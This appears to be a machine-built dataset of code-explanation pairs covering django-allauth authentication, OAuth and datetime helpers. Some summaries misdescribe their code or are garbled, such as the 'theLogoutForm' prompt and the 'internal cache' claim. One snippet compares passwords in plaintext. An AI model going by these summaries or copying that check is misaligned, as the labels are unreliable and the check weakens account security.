{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef from_iso_time(timestring, use_dateutil=True):\n    if not _iso8601_time_re.match(timestring):\n        raise ValueError('Not a valid ISO8601-formatted time string')\n    if dateutil_available and use_dateutil:\n        return parser.parse(timestring).time()\n    else:\n        if len(timestring) > 8:  # has microseconds\n            fmt = '%H:%M:%S.%f'\n        else:\n            fmt = '%H:%M:%S'\n        return datetime.datetime.strptime(timestring, fmt).time()", "response": "Parse an ISO8601 - formatted datetime string and return a datetime. time\n            object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_value(dct, key, value):\n    if '.' in key:\n        head, rest = key.split('.', 1)\n        target = dct.setdefault(head, {})\n        if not isinstance(target, dict):\n            raise ValueError(\n                'Cannot set {key} in {head} '\n                'due to existing value: {target}'.format(key=key, head=head, target=target),\n            )\n        set_value(target, rest, value)\n    else:\n        dct[key] = value", "response": "Set a value in a dict."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngiving a callable return a tuple of argument names. Handles functools. partial objects and functools. class - based callables.", "response": "def get_func_args(func):\n    \"\"\"Given a callable, return a tuple of argument names. Handles\n    `functools.partial` objects and class-based callables.\n\n    .. versionchanged:: 3.0.0a1\n        Do not return bound arguments, eg. ``self``.\n    \"\"\"\n    if isinstance(func, functools.partial):\n        return _signature(func.func)\n    if inspect.isfunction(func) or inspect.ismethod(func):\n        return _signature(func)\n    # Callable class\n    return _signature(func.__call__)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef resolve_field_instance(cls_or_instance):\n    if isinstance(cls_or_instance, type):\n        if not issubclass(cls_or_instance, FieldABC):\n            raise FieldInstanceResolutionError\n        return cls_or_instance()\n    else:\n        if not isinstance(cls_or_instance, FieldABC):\n            raise FieldInstanceResolutionError\n        return cls_or_instance", "response": "Return a Schema instance from a Marshmallow Schema class or instance."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting naive time to local time", "response": "def localize(self, dt, is_dst=False):\n        \"\"\"Convert naive time to local time\"\"\"\n        if dt.tzinfo is not None:\n            raise ValueError('Not naive datetime (tzinfo is already set)')\n        return dt.replace(tzinfo=self)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef normalize(self, dt, is_dst=False):\n        if dt.tzinfo is self:\n            return dt\n        if dt.tzinfo is None:\n            raise ValueError('Naive time - no tzinfo set')\n        return dt.astimezone(self)", "response": "Correct the timezone information on the given datetime"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if a username and password combination is valid.", "response": "def check_auth(email, password):\n    \"\"\"Check if a username/password combination is valid.\n    \"\"\"\n    try:\n        user = User.get(User.email == email)\n    except User.DoesNotExist:\n        return False\n    return password == user.password"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _stash_user(cls, user):\n        global _stash\n        ret = getattr(_stash, 'user', None)\n        _stash.user = user\n        return ret", "response": "Stashes the user in the _stash dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_email(self, token):\n        resp = requests.get(self.emails_url,\n                            params={'access_token': token.token})\n        emails = resp.json().get('values', [])\n        email = ''\n        try:\n            email = emails[0].get('email')\n            primary_emails = [e for e in emails if e.get('is_primary', False)]\n            email = primary_emails[0].get('email')\n        except (IndexError, TypeError, KeyError):\n            return ''\n        finally:\n            return email", "response": "Fetches email address from email API endpoint"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncheck whether or not the email address is already verified by allauth scope.", "response": "def is_email_verified(self, request, email):\n        \"\"\"\n        Checks whether or not the email address is already verified\n        beyond allauth scope, for example, by having accepted an\n        invitation before signing up.\n        \"\"\"\n        ret = False\n        verified_email = request.session.get('account_verified_email')\n        if verified_email:\n            ret = verified_email.lower() == email.lower()\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the URL to redirect to after logging in.", "response": "def get_login_redirect_url(self, request):\n        \"\"\"\n        Returns the default URL to redirect to after logging in.  Note\n        that URLs passed explicitly (e.g. by passing along a `next`\n        GET parameter) take precedence over the value returned here.\n        \"\"\"\n        assert request.user.is_authenticated\n        url = getattr(settings, \"LOGIN_REDIRECT_URLNAME\", None)\n        if url:\n            warnings.warn(\"LOGIN_REDIRECT_URLNAME is deprecated, simply\"\n                          \" use LOGIN_REDIRECT_URL with a URL name\",\n                          DeprecationWarning)\n        else:\n            url = settings.LOGIN_REDIRECT_URL\n        return resolve_url(url)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the URL to return to after successful e - mail confirmation.", "response": "def get_email_confirmation_redirect_url(self, request):\n        \"\"\"\n        The URL to return to after successful e-mail confirmation.\n        \"\"\"\n        if request.user.is_authenticated:\n            if app_settings.EMAIL_CONFIRMATION_AUTHENTICATED_REDIRECT_URL:\n                return  \\\n                    app_settings.EMAIL_CONFIRMATION_AUTHENTICATED_REDIRECT_URL\n            else:\n                return self.get_login_redirect_url(request)\n        else:\n            return app_settings.EMAIL_CONFIRMATION_ANONYMOUS_REDIRECT_URL"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef populate_username(self, request, user):\n        from .utils import user_username, user_email, user_field\n        first_name = user_field(user, 'first_name')\n        last_name = user_field(user, 'last_name')\n        email = user_email(user)\n        username = user_username(user)\n        if app_settings.USER_MODEL_USERNAME_FIELD:\n            user_username(\n                user,\n                username or self.generate_unique_username([\n                    first_name,\n                    last_name,\n                    email,\n                    username,\n                    'user']))", "response": "Populates the username field of the user model with the user s username."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsave a user instance using information provided in the theLogoutForm.", "response": "def save_user(self, request, user, form, commit=True):\n        \"\"\"\n        Saves a new `User` instance using information provided in the\n        signup form.\n        \"\"\"\n        from .utils import user_username, user_email, user_field\n\n        data = form.cleaned_data\n        first_name = data.get('first_name')\n        last_name = data.get('last_name')\n        email = data.get('email')\n        username = data.get('username')\n        user_email(user, email)\n        user_username(user, username)\n        if first_name:\n            user_field(user, 'first_name', first_name)\n        if last_name:\n            user_field(user, 'last_name', last_name)\n        if 'password1' in data:\n            user.set_password(data[\"password1\"])\n        else:\n            user.set_unusable_password()\n        self.populate_username(request, user)\n        if commit:\n            # Ability not to commit makes it easier to derive from\n            # this adapter by adding\n            user.save()\n        return user"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef clean_username(self, username, shallow=False):\n        for validator in app_settings.USERNAME_VALIDATORS:\n            validator(username)\n\n        # TODO: Add regexp support to USERNAME_BLACKLIST\n        username_blacklist_lower = [ub.lower()\n                                    for ub in app_settings.USERNAME_BLACKLIST]\n        if username.lower() in username_blacklist_lower:\n            raise forms.ValidationError(\n                self.error_messages['username_blacklisted'])\n        # Skipping database lookups when shallow is True, needed for unique\n        # username generation.\n        if not shallow:\n            from .utils import filter_users_by_username\n            if filter_users_by_username(username).exists():\n                user_model = get_user_model()\n                username_field = app_settings.USER_MODEL_USERNAME_FIELD\n                error_message = user_model._meta.get_field(\n                    username_field).error_messages.get('unique')\n                if not error_message:\n                    error_message = self.error_messages['username_taken']\n                raise forms.ValidationError(\n                    error_message,\n                    params={\n                        'model_name': user_model.__name__,\n                        'field_label': username_field,\n                    }\n                )\n        return username", "response": "Validates the username and returns the username that is valid."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nvalidates a password and returns a cleaned version of it.", "response": "def clean_password(self, password, user=None):\n        \"\"\"\n        Validates a password. You can hook into this if you want to\n        restric the allowed password choices.\n        \"\"\"\n        min_length = app_settings.PASSWORD_MIN_LENGTH\n        if min_length and len(password) < min_length:\n            raise forms.ValidationError(_(\"Password must be a minimum of {0} \"\n                                          \"characters.\").format(min_length))\n        validate_password(password, user)\n        return password"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_message(self, request, level, message_template,\n                    message_context=None, extra_tags=''):\n        \"\"\"\n        Wrapper of `django.contrib.messages.add_message`, that reads\n        the message text from a template.\n        \"\"\"\n        if 'django.contrib.messages' in settings.INSTALLED_APPS:\n            try:\n                if message_context is None:\n                    message_context = {}\n                message = render_to_string(message_template,\n                                           message_context).strip()\n                if message:\n                    messages.add_message(request, level, message,\n                                         extra_tags=extra_tags)\n            except TemplateDoesNotExist:\n                pass", "response": "Wrapper of django. contrib. messages. add_message that reads the message text from a template and writes it to the internal cache."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef confirm_email(self, request, email_address):\n        email_address.verified = True\n        email_address.set_as_primary(conditional=True)\n        email_address.save()", "response": "Confirm the email address"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconstructs the email confirmation url.", "response": "def get_email_confirmation_url(self, request, emailconfirmation):\n        \"\"\"Constructs the email confirmation (activation) url.\n\n        Note that if you have architected your system such that email\n        confirmations are sent outside of the request context `request`\n        can be `None` here.\n        \"\"\"\n        url = reverse(\n            \"account_confirm_email\",\n            args=[emailconfirmation.key])\n        ret = build_absolute_uri(\n            request,\n            url)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef authenticate(self, request, **credentials):\n        from allauth.account.auth_backends import AuthenticationBackend\n\n        self.pre_authenticate(request, **credentials)\n        AuthenticationBackend.unstash_authenticated_user()\n        user = authenticate(request, **credentials)\n        alt_user = AuthenticationBackend.unstash_authenticated_user()\n        user = user or alt_user\n        if user and app_settings.LOGIN_ATTEMPTS_LIMIT:\n            cache_key = self._get_login_attempts_cache_key(\n                request, **credentials)\n            cache.delete(cache_key)\n        else:\n            self.authentication_failed(request, **credentials)\n        return user", "response": "Only authenticates does not actually login. See login."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef extract_common_fields(self, data):\n        return dict(\n            dc=data.get('dc'),\n            role=data.get('role'),\n            account_name=data.get('accountname'),\n            user_id=data.get('user_id'),\n            login=data.get('login'),\n            login_url=data.get('login_url'),\n            api_endpoint=data.get('api_endpoint'),\n        )", "response": "Extract fields from a metadata query."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef to_dict(self, xml):\n        children = list(xml)\n        if not children:\n            return xml.text\n        else:\n            out = {}\n            for node in list(xml):\n                if node.tag in out:\n                    if not isinstance(out[node.tag], list):\n                        out[node.tag] = [out[node.tag]]\n                    out[node.tag].append(self.to_dict(node))\n                else:\n                    out[node.tag] = self.to_dict(node)\n            return out", "response": "Convert XML structure to dict recursively"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef provider_login_url(parser, token):\n    bits = token.split_contents()\n    provider_id = bits[1]\n    params = token_kwargs(bits[2:], parser, support_legacy=False)\n    return ProviderLoginURLNode(provider_id, params)", "response": "Return provider login url."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef save_user(self, request, sociallogin, form=None):\n        u = sociallogin.user\n        u.set_unusable_password()\n        if form:\n            get_account_adapter().save_user(request, u, form)\n        else:\n            get_account_adapter().populate_username(request, u)\n        sociallogin.save(request)\n        return u", "response": "Saves a newly signed up social login."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\npopulating the User instance with the data.", "response": "def populate_user(self,\n                      request,\n                      sociallogin,\n                      data):\n        \"\"\"\n        Hook that can be used to further populate the user instance.\n\n        For convenience, we populate several common fields.\n\n        Note that the user instance being populated represents a\n        suggested User instance that represents the social user that is\n        in the process of being logged in.\n\n        The User instance need not be completely valid and conflict\n        free. For example, verifying whether or not the username\n        already exists, is not a responsibility.\n        \"\"\"\n        username = data.get('username')\n        first_name = data.get('first_name')\n        last_name = data.get('last_name')\n        email = data.get('email')\n        name = data.get('name')\n        user = sociallogin.user\n        user_username(user, username or '')\n        user_email(user, valid_email_or_none(email) or '')\n        name_parts = (name or '').partition(' ')\n        user_field(user, 'first_name', first_name or name_parts[0])\n        user_field(user, 'last_name', last_name or name_parts[2])\n        return user"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_connect_redirect_url(self, request, socialaccount):\n        assert request.user.is_authenticated\n        url = reverse('socialaccount_connections')\n        return url", "response": "Returns the default URL to redirect to after successfully connecting a social account."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef validate_disconnect(self, account, accounts):\n        if len(accounts) == 1:\n            # No usable password would render the local account unusable\n            if not account.user.has_usable_password():\n                raise ValidationError(_(\"Your account has no password set\"\n                                        \" up.\"))\n            # No email address, no password reset\n            if app_settings.EMAIL_VERIFICATION \\\n                    == EmailVerificationMethod.MANDATORY:\n                if EmailAddress.objects.filter(user=account.user,\n                                               verified=True).count() == 0:\n                    raise ValidationError(_(\"Your account has no verified\"\n                                            \" e-mail address.\"))", "response": "Validate whether or not the socialaccount account can be safely disconnected."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef serialize_instance(instance):\n    data = {}\n    for k, v in instance.__dict__.items():\n        if k.startswith('_') or callable(v):\n            continue\n        try:\n            field = instance._meta.get_field(k)\n            if isinstance(field, BinaryField):\n                v = force_str(base64.b64encode(v))\n            elif isinstance(field, FileField):\n                if v and not isinstance(v, six.string_types):\n                    v = v.name\n            # Check if the field is serializable. If not, we'll fall back\n            # to serializing the DB values which should cover most use cases.\n            try:\n                json.dumps(v, cls=DjangoJSONEncoder)\n            except TypeError:\n                v = field.get_prep_value(v)\n                k = SERIALIZED_DB_FIELD_PREFIX + k\n        except FieldDoesNotExist:\n            pass\n        data[k] = v\n    return json.loads(json.dumps(data, cls=DjangoJSONEncoder))", "response": "Serialize the object to a JSON - encoded version of the object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_form_field_order(form, field_order):\n    if field_order is None:\n        return\n    fields = OrderedDict()\n    for key in field_order:\n        try:\n            fields[key] = form.fields.pop(key)\n        except KeyError:  # ignore unknown fields\n            pass\n    fields.update(form.fields)  # add remaining fields in original order\n    form.fields = fields", "response": "Sets the order of the fields in the form."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef build_absolute_uri(request, location, protocol=None):\n    from .account import app_settings as account_settings\n\n    if request is None:\n        site = Site.objects.get_current()\n        bits = urlsplit(location)\n        if not (bits.scheme and bits.netloc):\n            uri = '{proto}://{domain}{url}'.format(\n                proto=account_settings.DEFAULT_HTTP_PROTOCOL,\n                domain=site.domain,\n                url=location)\n        else:\n            uri = location\n    else:\n        uri = request.build_absolute_uri(location)\n    # NOTE: We only force a protocol if we are instructed to do so\n    # (via the `protocol` parameter, or, if the default is set to\n    # HTTPS. The latter keeps compatibility with the debatable use\n    # case of running your site under both HTTP and HTTPS, where one\n    # would want to make sure HTTPS links end up in password reset\n    # mails even while they were initiated on an HTTP password reset\n    # form.\n    if not protocol and account_settings.DEFAULT_HTTP_PROTOCOL == 'https':\n        protocol = account_settings.DEFAULT_HTTP_PROTOCOL\n    # (end NOTE)\n    if protocol:\n        uri = protocol + ':' + uri.partition(':')[2]\n    return uri", "response": "helper function to build an absolute URI for a single object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _base_signup_form_class():\n    if not app_settings.SIGNUP_FORM_CLASS:\n        return _DummyCustomSignupForm\n    try:\n        fc_module, fc_classname = app_settings.SIGNUP_FORM_CLASS.rsplit('.', 1)\n    except ValueError:\n        raise exceptions.ImproperlyConfigured('%s does not point to a form'\n                                              ' class'\n                                              % app_settings.SIGNUP_FORM_CLASS)\n    try:\n        mod = import_module(fc_module)\n    except ImportError as e:\n        raise exceptions.ImproperlyConfigured('Error importing form class %s:'\n                                              ' \"%s\"' % (fc_module, e))\n    try:\n        fc_class = getattr(mod, fc_classname)\n    except AttributeError:\n        raise exceptions.ImproperlyConfigured('Module \"%s\" does not define a'\n                                              ' \"%s\" class' % (fc_module,\n                                                               fc_classname))\n    if not hasattr(fc_class, 'signup'):\n        if hasattr(fc_class, 'save'):\n            warnings.warn(\"The custom signup form must offer\"\n                          \" a `def signup(self, request, user)` method\",\n                          DeprecationWarning)\n        else:\n            raise exceptions.ImproperlyConfigured(\n                'The custom signup form must implement a \"signup\" method')\n    return fc_class", "response": "Return the base signup form class that is used by the signup form manager."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprovide the credentials required to authenticate the user for the specified login.", "response": "def user_credentials(self):\n        \"\"\"\n        Provides the credentials required to authenticate the user for\n        login.\n        \"\"\"\n        credentials = {}\n        login = self.cleaned_data[\"login\"]\n        if app_settings.AUTHENTICATION_METHOD == AuthenticationMethod.EMAIL:\n            credentials[\"email\"] = login\n        elif (\n                app_settings.AUTHENTICATION_METHOD ==\n                AuthenticationMethod.USERNAME):\n            credentials[\"username\"] = login\n        else:\n            if self._is_login_email(login):\n                credentials[\"email\"] = login\n            credentials[\"username\"] = login\n        credentials[\"password\"] = self.cleaned_data[\"password\"]\n        return credentials"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the FacebookLocales. xml file and builds a dictionary relating every available language to a list of available regions for that language and a default region.", "response": "def _build_locale_table(filename_or_file):\n    \"\"\"\n    Parses the FacebookLocales.xml file and builds a dict relating every\n    available language ('en, 'es, 'zh', ...) with a list of available regions\n    for that language ('en' -> 'US', 'EN') and an (arbitrary) default region.\n    \"\"\"\n    # Require the XML parser module only if we want the default mapping\n    from xml.dom.minidom import parse\n\n    dom = parse(filename_or_file)\n\n    reps = dom.getElementsByTagName('representation')\n    locs = map(lambda r: r.childNodes[0].data, reps)\n\n    locale_map = {}\n    for loc in locs:\n        lang, _, reg = loc.partition('_')\n        lang_map = locale_map.setdefault(lang, {'regs': [], 'default': reg})\n        lang_map['regs'].append(reg)\n\n    # Default region overrides (arbitrary)\n    locale_map['en']['default'] = 'US'\n    # Special case: Use es_ES for Spain and es_LA for everything else\n    locale_map['es']['default'] = 'LA'\n    locale_map['zh']['default'] = 'CN'\n    locale_map['fr']['default'] = 'FR'\n    locale_map['pt']['default'] = 'PT'\n\n    return locale_map"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a callable that returns the default locale for the current FB.", "response": "def get_default_locale_callable():\n    \"\"\"\n    Wrapper function so that the default mapping is only built when needed\n    \"\"\"\n    exec_dir = os.path.dirname(os.path.realpath(__file__))\n    xml_path = os.path.join(exec_dir, 'data', 'FacebookLocales.xml')\n\n    fb_locales = _build_locale_table(xml_path)\n\n    def default_locale(request):\n        \"\"\"\n        Guess an appropiate FB locale based on the active Django locale.\n        If the active locale is available, it is returned. Otherwise,\n        it tries to return another locale with the same language. If there\n        isn't one avaible, 'en_US' is returned.\n        \"\"\"\n        chosen = 'en_US'\n        language = get_language()\n        if language:\n            locale = to_locale(language)\n            lang, _, reg = locale.partition('_')\n\n            lang_map = fb_locales.get(lang)\n            if lang_map is not None:\n                if reg in lang_map['regs']:\n                    chosen = lang + '_' + reg\n                else:\n                    chosen = lang + '_' + lang_map['default']\n        return chosen\n\n    return default_locale"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef EMAIL_REQUIRED(self):\n        from allauth.account import app_settings as account_settings\n        return self._setting(\"EMAIL_REQUIRED\", account_settings.EMAIL_REQUIRED)", "response": "Returns a boolean value that indicates whether the user is required to hand over an e - mail address when signing up"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the value of EMAIL_VERIFICATION", "response": "def EMAIL_VERIFICATION(self):\n        \"\"\"\n        See e-mail verification method\n        \"\"\"\n        from allauth.account import app_settings as account_settings\n        return self._setting(\"EMAIL_VERIFICATION\",\n                             account_settings.EMAIL_VERIFICATION)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a string representation of a social account. Includes the name of the user.", "response": "def to_str(self):\n        '''\n        Returns string representation of a social account. Includes the name\n        of the user.\n        '''\n        dflt = super(DataportenAccount, self).to_str()\n        return '%s (%s)' % (\n            self.account.extra_data.get('name', ''),\n            dflt,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\neven when email verification is not mandatory during signup, there may be circumstances during which you really want to prevent unverified users to proceed. This decorator ensures the user is authenticated and has a verified email address. If the former is not the case then the behavior is identical to that of the standard `login_required` decorator. If the latter does not hold, email verification mails are automatically resend and the user is presented with a page informing them they needs to verify their email address.", "response": "def verified_email_required(function=None,\n                            login_url=None,\n                            redirect_field_name=REDIRECT_FIELD_NAME):\n    \"\"\"\n    Even when email verification is not mandatory during signup, there\n    may be circumstances during which you really want to prevent\n    unverified users to proceed. This decorator ensures the user is\n    authenticated and has a verified email address. If the former is\n    not the case then the behavior is identical to that of the\n    standard `login_required` decorator. If the latter does not hold,\n    email verification mails are automatically resend and the user is\n    presented with a page informing them they needs to verify their email\n    address.\n    \"\"\"\n    def decorator(view_func):\n        @login_required(redirect_field_name=redirect_field_name,\n                        login_url=login_url)\n        def _wrapped_view(request, *args, **kwargs):\n            if not EmailAddress.objects.filter(user=request.user,\n                                               verified=True).exists():\n                send_email_confirmation(request, request.user)\n                return render(request,\n                              'account/verified_email_required.html')\n            return view_func(request, *args, **kwargs)\n        return _wrapped_view\n\n    if function:\n        return decorator(function)\n    return decorator"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nremoving empty keys from params.", "response": "def _strip_empty_keys(self, params):\n        \"\"\"Added because the Dropbox OAuth2 flow doesn't\n        work when scope is passed in, which is empty.\n        \"\"\"\n        keys = [k for k, v in params.items() if v == '']\n        for key in keys:\n            del params[key]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef int_to_base36(i):\n    if six.PY2:\n        char_set = '0123456789abcdefghijklmnopqrstuvwxyz'\n        if i < 0:\n            raise ValueError(\"Negative base36 conversion input.\")\n        if not isinstance(i, six.integer_types):\n            raise TypeError(\"Non-integer base36 conversion input.\")\n        if i < 36:\n            return char_set[i]\n        b36 = ''\n        while i != 0:\n            i, n = divmod(i, 36)\n            b36 = char_set[n] + b36\n    else:\n        from django.utils.http import int_to_base36\n        b36 = int_to_base36(i)\n    return b36", "response": "Convert an integer to base36."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsaving a new account.", "response": "def save(self, request, connect=False):\n        \"\"\"\n        Saves a new account. Note that while the account is new,\n        the user may be an existing one (when connecting accounts)\n        \"\"\"\n        assert not self.is_existing\n        user = self.user\n        user.save()\n        self.account.user = user\n        self.account.save()\n        if app_settings.STORE_TOKENS and self.token:\n            self.token.account = self.account\n            self.token.save()\n        if connect:\n            # TODO: Add any new email addresses automatically?\n            pass\n        else:\n            setup_user_email(request, user, self.email_addresses)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef extract_common_fields(self, data):\n        email = None\n        for curr_email in data.get(\"emails\", []):\n            email = email or curr_email.get(\"email\")\n            if curr_email.get(\"verified\", False) and \\\n                    curr_email.get(\"primary\", False):\n                email = curr_email.get(\"email\")\n\n        return dict(\n            email=email,\n            id=data.get('id'),\n            name=data.get('name'),\n            first_name=data.get('first_name'),\n            last_name=data.get('last_name'),\n            image_url=data.get('image_url')\n        )", "response": "Extract fields from a basic user query."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef complete_login(self, request, app, token, **kwargs):\n        '''\n        Arguments:\n            request - The get request to the callback URL\n                        /accounts/dataporten/login/callback.\n            app - The corresponding SocialApp model instance\n            token - A token object with access token given in token.token\n        Returns:\n            Should return a dict with user information intended for parsing\n            by the methods of the DataportenProvider view, i.e.\n            extract_uid(), extract_extra_data(), and extract_common_fields()\n        '''\n        # The athentication header\n        headers = {'Authorization': 'Bearer ' + token.token}\n\n        # Userinfo endpoint, for documentation see:\n        # https://docs.dataporten.no/docs/oauth-authentication/\n        userinfo_response = requests.get(\n            self.profile_url,\n            headers=headers,\n        )\n        # Raise exception for 4xx and 5xx response codes\n        userinfo_response.raise_for_status()\n\n        # The endpoint returns json-data and it needs to be decoded\n        extra_data = userinfo_response.json()['user']\n\n        # Finally test that the audience property matches the client id\n        # for validification reasons, as instructed by the Dataporten docs\n        # if the userinfo-response is used for authentication\n        if userinfo_response.json()['audience'] != app.client_id:\n            raise ProviderException(\n                'Dataporten returned a user with an audience field \\\n                 which does not correspond to the client id of the \\\n                 application.'\n                )\n\n        return self.get_provider().sociallogin_from_response(\n            request,\n            extra_data,\n        )", "response": "Complete the login process for the given token."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndispatch the user to the provider based authentication", "response": "def dispatch(self, request):\n        \"\"\"\n        View to handle final steps of OAuth based authentication where the user\n        gets redirected back to from the service provider\n        \"\"\"\n        login_done_url = reverse(self.adapter.provider_id + \"_callback\")\n        client = self._get_client(request, login_done_url)\n        if not client.is_valid():\n            if 'denied' in request.GET:\n                error = AuthError.CANCELLED\n            else:\n                error = AuthError.UNKNOWN\n            extra_context = dict(oauth_client=client)\n            return render_authentication_error(\n                request,\n                self.adapter.provider_id,\n                error=error,\n                extra_context=extra_context)\n        app = self.adapter.get_provider().get_app(request)\n        try:\n            access_token = client.get_access_token()\n            token = SocialToken(\n                app=app,\n                token=access_token['oauth_token'],\n                # .get() -- e.g. Evernote does not feature a secret\n                token_secret=access_token.get('oauth_token_secret', ''))\n            login = self.adapter.complete_login(request,\n                                                app,\n                                                token,\n                                                response=access_token)\n            login.token = token\n            login.state = SocialLogin.unstash_state(request)\n            return complete_social_login(request, login)\n        except OAuthError as e:\n            return render_authentication_error(\n                request,\n                self.adapter.provider_id,\n                exception=e)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting the object at path from the data dictionary.", "response": "def extract_from_dict(data, path):\n    \"\"\"\n    Navigate `data`, a multidimensional array (list or dictionary), and returns\n    the object at `path`.\n    \"\"\"\n    value = data\n    try:\n        for key in path:\n            value = value[key]\n        return value\n    except (KeyError, IndexError, TypeError):\n        return ''"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nextracts the email address from the data.", "response": "def _extract_email(data):\n    \"\"\"\n    {'elements': [{'handle': 'urn:li:emailAddress:319371470',\n               'handle~': {'emailAddress': 'raymond.penners@intenct.nl'}}]}\n    \"\"\"\n    ret = ''\n    elements = data.get('elements', [])\n    if len(elements) > 0:\n        ret = elements[0].get('handle~', {}).get('emailAddress', '')\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nobtain a temporary request token and to the request token and to the request token session.", "response": "def _get_request_token(self):\n        \"\"\"\n        Obtain a temporary request token to authorize an access token and to\n        sign the request to obtain the access token\n        \"\"\"\n        if self.request_token is None:\n            get_params = {}\n            if self.parameters:\n                get_params.update(self.parameters)\n            get_params['oauth_callback'] \\\n                = self.request.build_absolute_uri(self.callback_url)\n            rt_url = self.request_token_url + '?' + urlencode(get_params)\n            oauth = OAuth1(self.consumer_key,\n                           client_secret=self.consumer_secret)\n            response = requests.post(url=rt_url, auth=oauth)\n            if response.status_code not in [200, 201]:\n                raise OAuthError(\n                    _('Invalid response while obtaining request token'\n                      ' from \"%s\".') % get_token_prefix(\n                          self.request_token_url))\n            self.request_token = dict(parse_qsl(response.text))\n            self.request.session['oauth_%s_request_token' % get_token_prefix(\n                self.request_token_url)] = self.request_token\n        return self.request_token"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_access_token(self):\n        if self.access_token is None:\n            request_token = self._get_rt_from_session()\n            oauth = OAuth1(\n                self.consumer_key,\n                client_secret=self.consumer_secret,\n                resource_owner_key=request_token['oauth_token'],\n                resource_owner_secret=request_token['oauth_token_secret'])\n            at_url = self.access_token_url\n            # Passing along oauth_verifier is required according to:\n            # http://groups.google.com/group/twitter-development-talk/browse_frm/thread/472500cfe9e7cdb9#\n            # Though, the custom oauth_callback seems to work without it?\n            oauth_verifier = get_request_param(self.request, 'oauth_verifier')\n            if oauth_verifier:\n                at_url = at_url + '?' + urlencode(\n                    {'oauth_verifier': oauth_verifier})\n            response = requests.post(url=at_url, auth=oauth)\n            if response.status_code not in [200, 201]:\n                raise OAuthError(\n                    _('Invalid response while obtaining access token'\n                      ' from \"%s\".') % get_token_prefix(\n                          self.request_token_url))\n            self.access_token = dict(parse_qsl(response.text))\n\n            self.request.session['oauth_%s_access_token' % get_token_prefix(\n                self.request_token_url)] = self.access_token\n        return self.access_token", "response": "Obtain the access token to access private resources at the API."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a HttpResponseRedirect object to redirect the user to the URL the OAuth provider handles authorization.", "response": "def get_redirect(self, authorization_url, extra_params):\n        \"\"\"\n        Returns a ``HttpResponseRedirect`` object to redirect the user\n        to the URL the OAuth provider handles authorization.\n        \"\"\"\n        request_token = self._get_request_token()\n        params = {'oauth_token': request_token['oauth_token'],\n                  'oauth_callback': self.request.build_absolute_uri(\n                      self.callback_url)}\n        params.update(extra_params)\n        url = authorization_url + '?' + urlencode(params)\n        return HttpResponseRedirect(url)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_at_from_session(self):\n        try:\n            return self.request.session['oauth_%s_access_token'\n                                        % get_token_prefix(\n                                            self.request_token_url)]\n        except KeyError:\n            raise OAuthError(\n                _('No access token saved for \"%s\".')\n                % get_token_prefix(self.request_token_url))", "response": "Get the saved access token for private resources from the session."}
